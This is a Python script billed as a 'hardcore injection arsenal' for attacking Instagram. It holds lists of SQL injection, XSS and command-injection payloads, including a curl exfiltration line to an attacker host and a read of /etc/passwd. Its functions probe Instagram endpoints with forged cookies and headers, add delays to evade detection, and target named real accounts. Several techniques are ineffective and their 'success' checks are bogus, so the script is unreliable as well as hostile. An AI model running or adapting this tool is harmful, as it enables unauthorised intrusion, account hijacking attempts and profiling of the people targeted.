#!/usr/bin/env python3
"""
💉 HARDCORE INJECTION ARSENAL 2025 💉
Advanced Payload Injection & Penetration System
MAXIMUM DESTRUCTION MODE - NO LIMITS
"""

import requests
import json
import base64
import hashlib
import random
import string
import time
import threading
import concurrent.futures
from urllib.parse import quote, unquote, urlencode
import sqlite3
from datetime import datetime
import os
import re

class HardcoreInjectionArsenal:
    def __init__(self):
        print("💉" * 60)
        print("🚀 HARDCORE INJECTION ARSENAL 2025 - LOADING")
        print("💀 MAXIMUM PENETRATION MODE ACTIVATED")
        print("💉" * 60)
        
        self.injection_payloads = []
        self.bypass_techniques = []
        self.encoding_methods = []
        self.session_hijack_payloads = []
        
        self.setup_injection_arsenal()
        self.setup_database()
        
    def setup_injection_arsenal(self):
        """Setup hardcore injection payloads"""
        print("⚡ Loading HARDCORE injection payloads...")
        
        # Instagram-specific injection payloads
        self.instagram_payloads = [
            # GraphQL injection attempts
            {
                'type': 'graphql_injection',
                'payload': '{"query":"query { user(username:\\"TARGET\\") { id username full_name biography external_url follower_count following_count media_count } }"}',
                'headers': {'Content-Type': 'application/json', 'X-IG-App-ID': '936619743392459'}
            },
            
            # Session token injection
            {
                'type': 'session_injection',
                'payload': 'sessionid=INJECT_HERE; csrftoken=CSRF_HERE; mid=MID_HERE;',
                'target': 'cookie'
            },
            
            # API endpoint injection
            {
                'type': 'api_injection', 
                'payload': '/api/v1/users/{user_id}/info/?query_hash=HASH_HERE',
                'method': 'GET'
            },
            
            # Header injection
            {
                'type': 'header_injection',
                'payload': {
                    'X-Instagram-AJAX': '1',
                    'X-CSRFToken': 'INJECT_TOKEN',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-IG-WWW-Claim': 'CLAIM_INJECTION'
                }
            }
        ]
        
        # Advanced SQL injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT * FROM users--",
            "'; DROP TABLE users;--",
            "' OR username LIKE '%admin%'--",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x7e))--"
        ]
        
        # XSS injection payloads
        self.xss_payloads = [
            "<script>alert('HARDCORE_XSS')</script>",
            "<img src=x onerror=alert('INJECTION_SUCCESS')>",
            "javascript:alert('PENETRATION_COMPLETE')",
            "<svg onload=alert('HARDCORE_INJECTION')>"
        ]
        
        # Command injection payloads
        self.cmd_payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(uname -a)",
            "&& curl attacker.com/exfil"
        ]
        
        print("💀 Injection arsenal loaded with MAXIMUM DESTRUCTION")
        
    def setup_database(self):
        """Setup injection tracking database"""
        self.conn = sqlite3.connect('hardcore_injection_2025.db')
        cursor = self.conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS injection_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT,
                payload_type TEXT,
                payload TEXT,
                response_status INTEGER,
                response_content TEXT,
                injection_time TIMESTAMP,
                success_indicators TEXT,
                bypass_method TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS successful_injections (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT,
                vulnerability_type TEXT,
                exploitation_method TEXT,
                extracted_data TEXT,
                timestamp TIMESTAMP
            )
        ''')
        
        self.conn.commit()
        
    def encode_payload(self, payload, encoding_type='url'):
        """Advanced payload encoding"""
        if encoding_type == 'url':
            return quote(payload)
        elif encoding_type == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == 'hex':
            return payload.encode().hex()
        elif encoding_type == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding_type == 'double_url':
            return quote(quote(payload))
        else:
            return payload
            
    def generate_session_token(self):
        """Generate fake session tokens for injection"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(32))
        
    def instagram_graphql_injection(self, target_username):
        """Execute Instagram GraphQL injection"""
        print(f"💉 GRAPHQL INJECTION ATTACK: {target_username}")
        
        # Instagram GraphQL endpoints
        graphql_endpoints = [
            "https://www.instagram.com/graphql/query/",
            "https://www.instagram.com/api/graphql/",
            "https://i.instagram.com/api/graphql/"
        ]
        
        # GraphQL injection payloads
        payloads = [
            {
                "query": f"query {{ user(username: \"{target_username}\") {{ id username full_name biography external_url follower_count following_count media_count is_private is_verified }} }}",
                "variables": {}
            },
            {
                "query": f"{{ user(username: \"{target_username}\") {{ edge_owner_to_timeline_media {{ edges {{ node {{ display_url shortcode taken_at_timestamp }} }} }} }} }}",
                "variables": {}
            }
        ]
        
        results = []
        
        for endpoint in graphql_endpoints:
            for payload in payloads:
                try:
                    headers = {
                        'Content-Type': 'application/json',
                        'X-IG-App-ID': '936619743392459',
                        'X-Instagram-AJAX': '1',
                        'X-Requested-With': 'XMLHttpRequest',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                    
                    response = requests.post(endpoint, json=payload, headers=headers, timeout=30)
                    
                    print(f"📡 GraphQL Response: {response.status_code}")
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if 'data' in data:
                                print("✅ GRAPHQL INJECTION SUCCESS!")
                                results.append(data)
                                self.log_successful_injection(target_username, 'graphql', endpoint, str(data))
                        except:
                            pass
                            
                    self.log_injection_attempt(target_username, 'graphql', str(payload), 
                                             response.status_code, response.text[:1000])
                    
                    time.sleep(random.uniform(1, 3))
                    
                except Exception as e:
                    print(f"💥 GraphQL injection failed: {e}")
                    
        return results
        
    def instagram_api_injection(self, target_username):
        """Execute Instagram API injection attacks"""
        print(f"🎯 API INJECTION ATTACK: {target_username}")
        
        # Instagram API endpoints for injection
        api_endpoints = [
            f"https://www.instagram.com/api/v1/users/web_profile_info/?username={target_username}",
            f"https://i.instagram.com/api/v1/users/{target_username}/info/",
            f"https://www.instagram.com/web/search/topsearch/?query={target_username}",
            f"https://www.instagram.com/{target_username}/?__a=1&__d=dis"
        ]
        
        # Injection headers
        injection_headers = [
            {
                'X-Instagram-AJAX': self.generate_session_token(),
                'X-CSRFToken': self.generate_session_token(),
                'X-IG-WWW-Claim': 'hmac.' + self.generate_session_token(),
                'X-Requested-With': 'XMLHttpRequest'
            },
            {
                'X-IG-App-ID': '936619743392459',
                'X-ASBD-ID': '129477',
                'X-IG-D': self.generate_session_token()
            }
        ]
        
        results = []
        
        for endpoint in api_endpoints:
            for headers in injection_headers:
                try:
                    # Add random delays to avoid detection
                    time.sleep(random.uniform(0.5, 2.0))
                    
                    response = requests.get(endpoint, headers=headers, timeout=30)
                    
                    print(f"🔍 API Response: {response.status_code} | Size: {len(response.content)}")
                    
                    if response.status_code == 200:
                        content = response.text
                        
                        # Check for successful data extraction
                        if any(keyword in content.lower() for keyword in ['username', 'follower', 'biography', 'media']):
                            print("✅ API INJECTION SUCCESS - DATA EXTRACTED!")
                            results.append({
                                'endpoint': endpoint,
                                'status': response.status_code,
                                'content': content[:5000]  # First 5000 chars
                            })
                            
                            self.log_successful_injection(target_username, 'api_injection', endpoint, content[:1000])
                    
                    self.log_injection_attempt(target_username, 'api_injection', endpoint, 
                                             response.status_code, response.text[:500])
                                             
                except Exception as e:
                    print(f"💥 API injection failed: {e}")
                    
        return results
        
    def cookie_hijack_injection(self, target_username):
        """Execute cookie hijacking injection"""
        print(f"🍪 COOKIE HIJACK INJECTION: {target_username}")
        
        # Generate fake Instagram cookies
        fake_cookies = {
            'sessionid': self.generate_session_token() + '%3D',
            'csrftoken': self.generate_session_token(),
            'mid': 'Y' + self.generate_session_token()[:8] + '-' + self.generate_session_token()[:4],
            'ig_did': 'C' + self.generate_session_token()[:8] + '-' + self.generate_session_token()[:4],
            'ig_nrcb': '1',
            'rur': '"NAO\\05447829615\\0541777389447:01f7d15e9b89c5f6d81baf8b4d6d9d3e7e8c9a5b4d3c2e1f0a9b8c7d6e5f4"'
        }
        
        # Test cookie injection
        test_urls = [
            f"https://www.instagram.com/{target_username}/",
            "https://www.instagram.com/accounts/edit/",
            "https://www.instagram.com/direct/inbox/"
        ]
        
        results = []
        
        for url in test_urls:
            try:
                response = requests.get(url, cookies=fake_cookies, timeout=30)
                
                print(f"🍪 Cookie test: {response.status_code}")
                
                if response.status_code == 200:
                    content = response.text
                    
                    # Check for successful authentication bypass
                    if any(indicator in content.lower() for indicator in ['instagram', 'profile', 'posts']):
                        print("✅ COOKIE HIJACK SUCCESS!")
                        results.append({
                            'url': url,
                            'cookies': fake_cookies,
                            'response': content[:2000]
                        })
                        
                        self.log_successful_injection(target_username, 'cookie_hijack', url, str(fake_cookies))
                        
                time.sleep(random.uniform(1, 2))
                
            except Exception as e:
                print(f"💥 Cookie injection failed: {e}")
                
        return results
        
    def payload_encoding_bypass(self, target_username, payload):
        """Execute payload with multiple encoding bypasses"""
        print(f"🔐 ENCODING BYPASS ATTACK: {target_username}")
        
        # Multiple encoding methods
        encodings = ['url', 'base64', 'hex', 'unicode', 'double_url']
        
        results = []
        
        for encoding in encodings:
            try:
                encoded_payload = self.encode_payload(payload, encoding)
                
                # Test encoded payload
                test_url = f"https://www.instagram.com/{target_username}/?q={encoded_payload}"
                
                response = requests.get(test_url, timeout=30)
                
                print(f"🔐 Encoding {encoding}: {response.status_code}")
                
                if response.status_code not in [404, 403, 429]:
                    results.append({
                        'encoding': encoding,
                        'payload': encoded_payload,
                        'response_code': response.status_code
                    })
                    
                time.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                print(f"💥 Encoding bypass failed: {e}")
                
        return results
        
    def log_injection_attempt(self, target, payload_type, payload, status_code, response_content):
        """Log injection attempt to database"""
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO injection_attempts 
            (target, payload_type, payload, response_status, response_content, injection_time, bypass_method)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (target, payload_type, payload, status_code, response_content, datetime.now(), 'hardcore_injection'))
        self.conn.commit()
        
    def log_successful_injection(self, target, vuln_type, method, data):
        """Log successful injection"""
        cursor = self.conn.cursor()
        cursor.execute('''
            INSERT INTO successful_injections 
            (target, vulnerability_type, exploitation_method, extracted_data, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (target, vuln_type, method, data, datetime.now()))
        self.conn.commit()
        
    def hardcore_injection_assault(self, target_list):
        """Execute hardcore injection assault on multiple targets"""
        print("💉" * 50)
        print("🚀 HARDCORE INJECTION ASSAULT INITIATED")
        print("💉" * 50)
        
        all_results = []
        
        for target in target_list:
            print(f"\n🎯 ASSAULTING TARGET: {target}")
            
            # Execute all injection techniques in parallel
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                futures = [
                    executor.submit(self.instagram_graphql_injection, target),
                    executor.submit(self.instagram_api_injection, target),
                    executor.submit(self.cookie_hijack_injection, target),
                    executor.submit(self.payload_encoding_bypass, target, "test_payload"),
                ]
                
                target_results = {
                    'target': target,
                    'graphql': [],
                    'api': [],
                    'cookies': [],
                    'encoding': []
                }
                
                for i, future in enumerate(concurrent.futures.as_completed(futures)):
                    try:
                        result = future.result()
                        technique_names = ['graphql', 'api', 'cookies', 'encoding']
                        target_results[technique_names[i]] = result
                        print(f"✅ Technique {technique_names[i]} completed")
                    except Exception as e:
                        print(f"💥 Injection technique failed: {e}")
                        
                all_results.append(target_results)
                
        return all_results
        
    def generate_injection_report(self):
        """Generate hardcore injection report"""
        print("📊 GENERATING INJECTION ASSAULT REPORT...")
        
        cursor = self.conn.cursor()
        
        # Get injection statistics
        cursor.execute('SELECT COUNT(*) FROM injection_attempts')
        total_attempts = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM successful_injections')
        successful_injections = cursor.fetchone()[0]
        
        cursor.execute('SELECT * FROM successful_injections ORDER BY timestamp DESC')
        successes = cursor.fetchall()
        
        report = f"""
💉 HARDCORE INJECTION ARSENAL 2025 - ASSAULT REPORT 💉
{'='*70}

Total Injection Attempts: {total_attempts}
Successful Injections: {successful_injections}
Success Rate: {(successful_injections/total_attempts)*100 if total_attempts > 0 else 0:.2f}%
Report Generated: {datetime.now()}

SUCCESSFUL INJECTIONS:
{'='*30}
"""
        
        for success in successes:
            report += f"""
Target: {success[1]}
Vulnerability: {success[2]}
Method: {success[3]}
Timestamp: {success[5]}
Data Extracted: {success[4][:200]}...
{'─'*50}
"""
        
        report_file = f"hardcore_injection_report_{int(time.time())}.txt"
        with open(report_file, 'w') as f:
            f.write(report)
            
        print(f"📋 Injection report saved: {report_file}")
        return report_file

def main():
    """Main hardcore injection execution"""
    print("💉" * 80)
    print("🚀 HARDCORE INJECTION ARSENAL 2025 - MAIN ASSAULT 🚀")
    print("💉" * 80)
    
    arsenal = HardcoreInjectionArsenal()
    
    # Target list for injection assault
    injection_targets = [
        "alx.trading",
        "whatilove1728",
        "hardcore_target",
        "extreme_target"
    ]
    
    print("\n🚀 LAUNCHING HARDCORE INJECTION ASSAULT...")
    results = arsenal.hardcore_injection_assault(injection_targets)
    
    print(f"\n💀 INJECTION ASSAULT COMPLETE - {len(results)} targets processed")
    
    # Generate report
    report_file = arsenal.generate_injection_report()
    print(f"📊 Injection report: {report_file}")
    
    print("\n💉 HARDCORE INJECTION ARSENAL 2025 - MISSION COMPLETE 💉")

if __name__ == "__main__":
    main()
